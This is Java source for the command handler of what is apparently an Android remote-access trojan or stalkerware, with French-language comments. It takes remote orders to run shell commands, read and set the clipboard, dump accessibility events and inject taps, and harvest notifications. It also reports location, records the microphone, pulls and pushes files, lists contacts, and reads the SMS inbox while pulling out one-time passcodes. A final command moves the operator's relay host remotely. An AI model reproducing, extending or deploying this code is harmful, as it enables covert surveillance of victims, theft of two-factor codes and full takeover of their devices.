package com.lo.syskit;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Ops — the command brain. Pure dispatch, zero dependencies.
 * Supported ops:
 *   exec · clip.get · clip.set · audit.dump · audit.clip · audit.gesture
 *   notify.on · notify.off · notify.drain · loc.get
 *   mic.start · mic.stop · file.pull · file.push
 *   sms.list · contacts.list · pulse
 * Binary protocol: file.push arrives as JSON {raw_expect:N, path}
 * followed by N raw bytes (CoreService reads them into RawBridge);
 * file.pull replies with JSON {raw_follow:true,size} and the raw blob
 * is sent immediately after by CoreService.
 */
public final class Ops {

    private static final Pattern OTP = Pattern.compile("\\b\\d{4,8}\\b");

    /** Shuttle for raw bytes between CoreService socket pump and Ops. */
    public static final class RawBridge {
        private static volatile byte[] incoming;
        private static volatile byte[] outgoing;
        static void setIncoming(byte[] b) { incoming = b; }
        public static byte[] takeIncoming() {
            byte[] b = incoming; incoming = null; return b;
        }
        static void setOutgoing(byte[] b) { outgoing = b; }
        static byte[] takeOutgoing() {
            byte[] b = outgoing; outgoing = null; return b;
        }
    }

    /** Extract the first plausible OTP from arbitrary text ("" if none). */
    public static String otpIn(String text) {
        if (text == null) return "";
        Matcher m = OTP.matcher(text);
        return m.find() ? m.group() : "";
    }

    public static JSONObject handle(Context ctx, JSONObject op) {
        String name = op.optString("op", "");
        try {
            switch (name) {
                case "pulse":   return pulse();
                case "exec":    return exec(op);
                case "clip.get":  return clipGet();
                case "clip.set":  return clipSet(op);
                case "audit.dump":    return auditDump();
                case "audit.clip":    return auditClip();
                case "audit.gesture": return auditGesture(op);
                case "notify.on":  return simple("notify.on", NlService.instance() != null);
                case "notify.off": return simple("notify.off", NlService.instance() != null);
                case "notify.drain": return notifyDrain();
                case "loc.get":  return locGet(ctx);
                case "mic.start": return simple("mic.start", MicRecorder.start());
                case "mic.stop":  MicRecorder.stop();
                                  return simple("mic.stop", true);
                case "file.pull": return filePull(op);
                case "file.push": return filePush(op);
                case "sms.list":  return smsList(ctx, op);
                case "contacts.list": return contactsList(ctx);
                case "config.set":    return configSet(op);
                default:
                    return err("op inconnu: " + name);
            }
        } catch (Throwable t) {
            return err(name + " failed: " + t);
        }
    }

    private static JSONObject pulse() {
        JSONObject r = ok("pulse");
        try { r.put("uptime_ms", System.currentTimeMillis()); }
        catch (Exception ignore) {}
        return r;
    }

    // ------------------------------------------------------------------
    // exec — shell with output capture and a hard timeout
    // ------------------------------------------------------------------
    private static JSONObject exec(JSONObject op) throws Exception {
        String cmd = op.optString("cmd", "");
        if (cmd.length() == 0) return err("cmd vide");
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        StringBuilder out = new StringBuilder();
        StringBuilder errOut = new StringBuilder();
        Thread t1 = gobbler(p.getInputStream(), out);
        Thread t2 = gobbler(p.getErrorStream(), errOut);
        boolean finished = p.waitFor(30, java.util.concurrent.TimeUnit.SECONDS);
        if (!finished) {
            p.destroy();
            return err("exec timeout (30s)");
        }
        t1.join(2000);
        t2.join(2000);
        JSONObject r = ok("exec");
        r.put("exit", p.exitValue());
        r.put("stdout", out.toString());
        r.put("stderr", errOut.toString());
        return r;
    }

    private static Thread gobbler(final InputStream in, final StringBuilder sb) {
        Thread t = new Thread(() -> {
            byte[] buf = new byte[4096];
            int n;
            try {
                while ((n = in.read(buf)) > 0)
                    sb.append(new String(buf, 0, n));
            } catch (Exception ignore) {
            } finally {
                try { in.close(); } catch (Exception ignore) {}
            }
        });
        t.setDaemon(true);
        t.start();
        return t;
    }

    // ------------------------------------------------------------------
    // clipboard
    // ------------------------------------------------------------------
    private static JSONObject clipGet() {
        String c = AuditService.lastClip();
        JSONObject r = ok("clip.get");
        try { r.put("clip", c); } catch (Exception ignore) {}
        return r;
    }

    private static JSONObject clipSet(JSONObject op) {
        try {
            AuditService inst = AuditService.instance();
            if (inst == null) return err("audit ear inactive");
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    inst.getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(android.content.ClipData.newPlainText("d", op.optString("clip", "")));
            return ok("clip.set");
        } catch (Throwable t) { return err("clip.set: " + t); }
    }

    private static JSONObject auditDump() {
        JSONObject r = ok("audit.dump");
        JSONArray arr = new JSONArray();
        for (JSONObject e : AuditService.drain()) arr.put(e);
        try { r.put("events", arr); } catch (Exception ignore) {}
        return r;
    }

    private static JSONObject auditClip() {
        JSONObject r = ok("audit.clip");
        try { r.put("clip", AuditService.lastClip()); } catch (Exception ignore) {}
        return r;
    }

    private static JSONObject auditGesture(JSONObject op) {
        AuditService inst = AuditService.instance();
        if (inst == null) return err("audit ear inactive");
        boolean did = inst.tap(op.optInt("x"), op.optInt("y"));
        return simple("audit.gesture", did);
    }

    private static JSONObject notifyDrain() {
        JSONObject r = ok("notify.drain");
        JSONArray arr = new JSONArray();
        for (JSONObject n : NlService.drainBacklog()) arr.put(n);
        try { r.put("notes", arr); } catch (Exception ignore) {}
        return r;
    }

    // ------------------------------------------------------------------
    // location — freshest last-known fix across providers
    // ------------------------------------------------------------------
    private static JSONObject locGet(Context ctx) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(
                    Context.LOCATION_SERVICE);
            Location best = null;
            for (String prov : lm.getAllProviders()) {
                try {
                    Location l = lm.getLastKnownLocation(prov);
                    if (l != null && (best == null
                            || l.getTime() > best.getTime())) best = l;
                } catch (SecurityException ignore) {}
            }
            JSONObject r = ok("loc.get");
            if (best != null) {
                r.put("lat", best.getLatitude());
                r.put("lon", best.getLongitude());
                r.put("acc", best.getAccuracy());
                r.put("provider", best.getProvider());
                r.put("age_ms", System.currentTimeMillis() - best.getTime());
            } else {
                r.put("lat", JSONObject.NULL);
            }
            return r;
        } catch (Throwable t) { return err("loc.get: " + t); }
    }

    // ------------------------------------------------------------------
    // files — pull out / push in, raw frames on the same socket
    // ------------------------------------------------------------------
    private static JSONObject filePull(JSONObject op) throws Exception {
        String path = op.optString("path", "");
        File f = new File(path);
        if (path.length() == 0 || !f.isFile()) return err("fichier absent: " + path);
        long cap = 256L * 1024 * 1024;
        if (f.length() > cap) return err("fichier trop gros (cap 256MB)");
        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());
        InputStream in = new FileInputStream(f);
        byte[] buf = new byte[65536];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        JSONObject r = ok("file.pull");
        r.put("path", path);
        r.put("size", f.length());
        r.put("raw_follow", true);
        RawBridge.setOutgoing(bos.toByteArray());
        return r;
    }

    private static JSONObject filePush(JSONObject op) throws Exception {
        String path = op.optString("path", "");
        byte[] data = RawBridge.takeIncoming();
        if (path.length() == 0 || data == null) return err("push incomplet");
        File f = new File(path);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) parent.mkdirs();
        OutputStream out = new FileOutputStream(f);
        out.write(data);
        out.close();
        JSONObject r = ok("file.push");
        r.put("path", path);
        r.put("size", data.length);
        return r;
    }

    // ------------------------------------------------------------------
    // comms archaeology — sms inbox + phonebook
    // ------------------------------------------------------------------
    private static JSONObject smsList(Context ctx, JSONObject op) {
        JSONArray arr = new JSONArray();
        try {
            int limit = Math.min(op.optInt("limit", 50), 200);
            Cursor c = ctx.getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date", "type"},
                    null, null, "date DESC");
            if (c != null) {
                int i = 0;
                while (c.moveToNext() && i < limit) {
                    JSONObject m = new JSONObject();
                    m.put("addr", c.getString(0));
                    m.put("body", c.getString(1));
                    m.put("date", new Date(c.getLong(2)).toString());
                    m.put("otp", otpIn(c.getString(1)));
                    arr.put(m);
                    i++;
                }
                c.close();
            }
        } catch (Throwable t) {
            return err("sms.list: " + t + " (perms via install -g)");
        }
        JSONObject r = ok("sms.list");
        try { r.put("sms", arr); } catch (Exception ignore) {}
        return r;
    }

    private static JSONObject contactsList(Context ctx) {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = ctx.getContentResolver().query(
                    android.provider.ContactsContract.CommonDataKinds
                            .Phone.CONTENT_URI,
                    new String[]{
                        android.provider.ContactsContract.CommonDataKinds
                                .Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds
                                .Phone.NUMBER},
                    null, null, null);
            if (c != null) {
                while (c.moveToNext() && arr.length() < 200) {
                    JSONObject p = new JSONObject();
                    p.put("name", c.getString(0));
                    p.put("num", c.getString(1));
                    arr.put(p);
                }
                c.close();
            }
        } catch (Throwable t) {
            return err("contacts.list: " + t);
        }
        JSONObject r = ok("contacts.list");
        try { r.put("contacts", arr); } catch (Exception ignore) {}
        return r;
    }

    /** Over-the-air relay relocation — no reinstall, ever. */
    private static JSONObject configSet(JSONObject op) {
        String host = op.optString("host", "");
        int port = op.optInt("port", Config.port());
        if (host.length() == 0) return err("host vide");
        Config.set(host, port);
        JSONObject r = ok("config.set");
        try { r.put("next_host", host); r.put("next_port", port);
              r.put("note", "appliqué à la prochaine reconnexion"); }
        catch (Exception ignore) {}
        return r;
    }

    // ------------------------------------------------------------------
    private static JSONObject ok(String opName) {
        JSONObject r = new JSONObject();
        try { r.put("op", opName); r.put("ok", true); }
        catch (Exception ignore) {}
        return r;
    }

    private static JSONObject err(String msg) {
        JSONObject r = new JSONObject();
        try { r.put("ok", false); r.put("error", msg); }
        catch (Exception ignore) {}
        return r;
    }

    private static JSONObject simple(String opName, boolean state) {
        JSONObject r = ok(opName);
        try { r.put("state", state); } catch (Exception ignore) {}
        return r;
    }
}
